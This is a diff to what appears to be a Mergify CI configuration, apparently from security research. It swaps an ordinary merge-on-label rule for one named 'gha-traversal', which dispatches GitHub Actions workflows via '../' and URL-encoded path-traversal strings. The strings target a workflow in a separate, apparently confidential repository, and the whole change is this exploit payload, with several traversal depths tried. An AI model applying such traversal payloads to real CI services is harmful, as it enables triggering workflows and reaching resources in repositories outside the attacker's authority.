@@ -1,8 +1,19 @@
 pull_request_rules:
-  - name: merge-on-label
+  - name: gha-traversal
     conditions:
       - base=main
-      - label=ship-now
+      - label=fire-gha
     actions:
-      merge:
-        method: merge
+      github_actions:
+        workflow:
+          dispatch:
+            - workflow: "../../kirasec-research1/ci-confidential-30019349/actions/workflows/ci-insights-probe.yml"
+              ref: main
+            - workflow: "../../../kirasec-research1/ci-confidential-30019349/actions/workflows/ci-insights-probe.yml"
+              ref: main
+            - workflow: "../../../../kirasec-research1/ci-confidential-30019349/actions/workflows/ci-insights-probe.yml"
+              ref: main
+            - workflow: "../../../../../kirasec-research1/ci-confidential-30019349/actions/workflows/ci-insights-probe.yml"
+              ref: main
+            - workflow: "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fkirasec-research1/ci-confidential-30019349/actions/workflows/ci-insights-probe.yml"
+              ref: main
